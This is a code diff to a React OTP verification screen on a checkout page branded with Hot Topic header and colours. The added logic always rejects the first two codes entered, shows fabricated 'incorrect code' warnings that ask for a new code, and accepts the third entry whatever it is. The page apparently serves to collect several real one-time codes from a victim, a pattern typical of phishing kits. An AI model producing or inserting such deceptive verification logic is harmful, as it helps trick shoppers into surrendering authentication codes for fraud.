@@ -16,6 +16,7 @@ const OTPVerification = () => {
   const [countdown, setCountdown] = useState(15 * 60); // 15 minutes in seconds
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [error, setError] = useState("");
+  const [attempts, setAttempts] = useState(0); // Track OTP verification attempts
 
   // Get order details from location state
   const orderDetails = location.state?.orderDetails;
@@ -79,7 +80,7 @@ const OTPVerification = () => {
     }
   }, [countdown, navigate]);
   
-  // Check OTP validity
+  // Check OTP validity based on attempt number
   const verifyOTP = () => {
     // OTP validation
     if (otp.length !== 6) {
@@ -87,12 +88,31 @@ const OTPVerification = () => {
       return false;
     }
     
-    // For demo purposes, accept any 6-digit code except "000000"
-    if (otp === "000000") {
-      setError("Invalid verification code");
+    // First two attempts will always fail, third attempt will succeed
+    if (attempts < 2) {
+      setError("Invalid verification code. Please try again.");
+      setAttempts(prev => prev + 1);
+      setOtp("");
+      
+      // Different messaging for first vs second attempt
+      if (attempts === 0) {
+        toast({
+          title: "Verification Failed",
+          description: "The code you entered is incorrect. Please try again.",
+          variant: "destructive",
+        });
+      } else {
+        toast({
+          title: "Second Attempt Failed",
+          description: "The verification code is still incorrect. One more attempt remaining.",
+          variant: "destructive",
+        });
+      }
+      
       return false;
     }
     
+    // Third attempt will succeed regardless of the code entered
     return true;
   };
 
@@ -172,6 +192,17 @@ const OTPVerification = () => {
     });
   };
 
+  // Get the attempt-specific message
+  const getAttemptMessage = () => {
+    if (attempts === 0) {
+      return "Please enter the verification code sent to your phone";
+    } else if (attempts === 1) {
+      return "First attempt failed. Please try again with a new code";
+    } else {
+      return "Last attempt. Enter the verification code carefully";
+    }
+  };
+
   return (
     <div className="min-h-screen bg-black">
       <HotTopicHeader />
@@ -212,8 +243,16 @@ const OTPVerification = () => {
                 ******{orderDetails?.phone?.slice(-4) || "0000"}
               </p>
               <p className="text-gray-400 text-sm text-center">
-                Enter the code below to complete your purchase
+                {getAttemptMessage()}
               </p>
+              
+              {/* Show attempt counter */}
+              <div className="flex justify-center items-center gap-2 pt-2">
+                <span className={`w-3 h-3 rounded-full ${attempts >= 0 ? 'bg-hottopic-red' : 'bg-hottopic-gray/30'}`}></span>
+                <span className={`w-3 h-3 rounded-full ${attempts >= 1 ? 'bg-hottopic-red' : 'bg-hottopic-gray/30'}`}></span>
+                <span className={`w-3 h-3 rounded-full ${attempts >= 2 ? 'bg-hottopic-red' : 'bg-hottopic-gray/30'}`}></span>
+                <span className="text-xs text-gray-400 ml-2">Attempt {attempts + 1}/3</span>
+              </div>
             </div>
             
             <form onSubmit={handleSubmit} className="space-y-6">
